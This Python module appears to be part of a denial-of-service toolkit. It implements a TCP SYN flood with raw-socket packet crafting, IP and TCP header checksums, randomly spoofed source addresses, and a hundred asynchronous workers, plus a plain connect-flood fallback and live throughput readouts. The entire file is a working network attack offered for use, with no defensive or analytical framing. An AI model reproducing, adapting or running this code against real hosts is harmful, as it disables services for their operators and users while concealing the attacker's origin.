# layers/layer4/tcp_flood.py
import socket
import random
import asyncio
import struct
import time
from typing import Optional
import logging
from colorama import Fore, Style

logger = logging.getLogger(__name__)


class TCPFlood:
    """TCP Flood атака с поддержкой спуфинга IP (асинхронные отправки)."""
    
    def __init__(self, target_ip: str, target_port: int, workers: int = 100,
                 spoof_ip: bool = False, packet_size: int = 1024,
                 source_port: int = 0, ttl: int = 64):
        self.target_ip = target_ip
        self.target_port = target_port
        self.workers = workers
        self.spoof_ip = spoof_ip
        self.packet_size = packet_size
        self.source_port = source_port if source_port > 0 else None
        self.ttl = ttl
        
        self.sent_packets = 0
        self.sent_bytes = 0
        self._running = False
        self._tasks = []
        self._start_time = 0
        
        if spoof_ip:
            self.generate_spoof_ips()
    
    def generate_spoof_ips(self):
        self.source_ips = []
        for _ in range(100):
            ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}." \
                 f"{random.randint(0, 255)}.{random.randint(1, 254)}"
            self.source_ips.append(ip)
    
    def craft_syn_packet(self, source_ip: str, source_port: int) -> bytes:
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = self.ttl
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        tcp_source = source_port
        tcp_dest = self.target_port
        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + \
                   (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(self.target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
            source_address,
            dest_address,
            placeholder,
            protocol,
            tcp_length
        )
        psh = psh + tcp_header
        
        tcp_check = self.checksum(psh)
        tcp_header = struct.pack('!HHLLBBH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window
        ) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def checksum(self, msg: bytes) -> int:
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    async def start(self):
        self._running = True
        self._start_time = time.time()
        
        print(f"{Fore.CYAN}🚀 Starting {self.workers} TCP flood workers...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📡 TTL: {self.ttl}{Style.RESET_ALL}")
        
        if self.spoof_ip:
            try:
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_sock.close()
            except PermissionError:
                print(f"{Fore.YELLOW}⚠️  IP spoofing requires root. Falling back to normal mode.{Style.RESET_ALL}")
                self.spoof_ip = False
        
        if self.source_port:
            print(f"{Fore.CYAN}🔌 Source port: {self.source_port}{Style.RESET_ALL}")
        
        self._tasks = []
        for i in range(self.workers):
            if self.spoof_ip:
                task = asyncio.create_task(self.spoof_worker(i))
            else:
                task = asyncio.create_task(self.normal_worker(i))
            self._tasks.append(task)
        
        try:
            await asyncio.gather(*self._tasks)
        except asyncio.CancelledError:
            pass
    
    async def spoof_worker(self, worker_id: int):
        """Воркер с IP спуфингом (асинхронная отправка raw пакетов)."""
        sock = None
        loop = asyncio.get_running_loop()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setblocking(False)   # Для работы с loop.sock_sendto
            
            if self.source_port:
                base_port = self.source_port
            else:
                base_port = random.randint(1024, 65535)
            
            while self._running:
                source_port = base_port + random.randint(0, 100)
                source_ip = random.choice(self.source_ips)
                packet = self.craft_syn_packet(source_ip, source_port)
                
                try:
                    await loop.sock_sendto(sock, packet, (self.target_ip, self.target_port))
                    self.sent_packets += 1
                    self.sent_bytes += len(packet)
                    
                    if self.sent_packets % 1000 == 0 and worker_id == 0:
                        elapsed = time.time() - self._start_time
                        pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
                        print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
                              f"⚡ PPS: {pps:,} | "
                              f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
                
                except (BlockingIOError, socket.error):
                    await asyncio.sleep(0.001)
                    continue
                
                await asyncio.sleep(0.0001)
        
        except PermissionError:
            logger.error(f"Permission denied: need root/admin privileges for raw sockets")
            print(f"{Fore.RED}❌ Permission denied: need root/admin privileges for raw sockets{Style.RESET_ALL}")
        except Exception as e:
            if self._running:
                logger.error(f"Worker {worker_id} error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    async def normal_worker(self, worker_id: int):
        """Воркер без спуфинга (асинхронные сокеты)."""
        loop = asyncio.get_running_loop()
        
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                
                await loop.sock_connect(sock, (self.target_ip, self.target_port))
                
                self.sent_packets += 1
                self.sent_bytes += 64
                
                sock.close()
                
                if self.sent_packets % 1000 == 0 and worker_id == 0:
                    elapsed = time.time() - self._start_time
                    pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
                    print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
                          f"⚡ PPS: {pps:,} | "
                          f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
                
            except (ConnectionRefusedError, OSError, asyncio.TimeoutError):
                pass
            except Exception as e:
                logger.debug(f"Normal worker error: {e}")
            
            await asyncio.sleep(0.001)
    
    def stop(self):
        self._running = False
        for task in self._tasks:
            task.cancel()
        
        print(f"\n{Fore.GREEN}✅ TCP Flood stopped{Style.RESET_ALL}")
        print(f"📊 Total packets: {self.sent_packets:,}")
        print(f"💾 Total data: {self.sent_bytes / 1024 / 1024:.2f} MB")
        
        if self._start_time > 0:
            elapsed = time.time() - self._start_time
            avg_pps = int(self.sent_packets / elapsed)
            print(f"⚡ Average PPS: {avg_pps:,}")